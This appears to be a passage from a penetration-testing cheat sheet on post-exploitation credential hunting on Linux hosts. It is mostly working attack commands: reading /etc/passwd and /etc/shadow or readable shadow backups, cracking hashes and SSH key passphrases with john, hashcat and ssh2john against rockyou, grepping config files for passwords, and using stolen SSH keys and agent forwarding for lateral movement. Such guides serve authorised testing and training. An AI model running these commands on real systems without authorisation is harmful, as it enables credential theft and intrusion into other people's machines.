### References

- [GTFOBins: Privilege Escalation](https://gtfobins.github.io/)
- [Exploit-DB](https://www.exploit-db.com/)
- [Linux Privilege Escalation](https://github.com/sleventyeleven/linuxprivchecker)

---

!!! tip "Tip"
    `grep -r "password" /etc /home /var/www 2>/dev/null` catches a surprising number of credentials in config files. Also check `.bash_history`, `.bashrc`, `.profile`, and `/var/log/` for command history with embedded credentials.

## Extracting User Information from `/etc/passwd`

The `/etc/passwd` file contains information about system users, including their home directories and assigned shells. It is world-readable, allowing attackers to enumerate local users.

### Listing System Users

```bash
cat /etc/passwd
```

Example output:

```bash
root:x:0:0:root:/root:/bin/bash
john:x:1001:1001:John Doe:/home/john:/bin/bash
```

If a user entry contains a password hash instead of `x`, it may indicate a system with outdated authentication configurations.

---
## Extracting Password Hashes from `/etc/shadow`

The `/etc/shadow` file contains encrypted password hashes and is only accessible by root.

### Checking Permissions

```bash
ls -lah /etc/shadow
```

If the file is world-readable, password hashes can be extracted directly:

```bash
cat /etc/shadow
```

Example output:

```bash
root:$6$abc123$K1VZVuJx0UwK1yR3c7z4J0:18701:0:99999:7:::
john:$6$def456$L7MqNZa27N8nYgU1/MU8:18701:0:99999:7:::
```

These hashes can be cracked using `hashcat` or `John the Ripper`.

### Extracting Hashes Using Readable `shadow` Backups

If a backup of `/etc/shadow` exists and is world-readable, it can be exploited:

```bash
find / -name "shadow*" -type f -readable 2>/dev/null
```

Extract hashes for offline cracking:

```bash
cat /var/backups/shadow.bak
```

Transfer the file and crack it using:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
```

or

```bash
hashcat -m 1800 shadow.bak /usr/share/wordlists/rockyou.txt
```

This allows retrieval of plaintext passwords from stored hashes.

---
## Hunting for SSH Private Keys

SSH keys are commonly used for authentication and, if improperly secured, can be leveraged to gain unauthorized access.

### Searching for Private Keys

```bash
find / -name "id_rsa" -type f 2>/dev/null
```

or

```bash
find /home -name "*.pem" -o -name "*.ppk" 2>/dev/null
```

If a private key is found, check its permissions:

```bash
ls -lah ~/.ssh/id_rsa
```

If readable, it can be used to log in to remote machines.

### Extracting Passphrases from Encrypted SSH Keys

If the private key is encrypted, extract the passphrase hash:

```bash
ssh2john id_rsa > ssh.hash
```

Crack the passphrase with `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

Once cracked, use the decrypted key:

```bash
ssh -i id_rsa user@target
```

This grants access to the remote system using the compromised credentials.

---
## Searching for Passwords in Configuration Files

### Check for "password" recursively
```bash
grep -iR --color=always 'password' .
```
### Searching for Passwords in Files

```bash
grep -r "password" /etc/
find / -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.json" \) -exec grep -i "password" {} + 2>/dev/null
```

---
## Exploiting `id_rsa` for Lateral Movement

If an SSH key is obtained, attempt authentication across other systems.

### Using SSH Key for Remote Access

```bash
ssh -i id_rsa user@target
```

If SSH agent forwarding is enabled, escalate access:

```bash
ssh -A user@intermediate
ssh user@target
```

This allows pivoting through compromised systems using agent-forwarded credentials.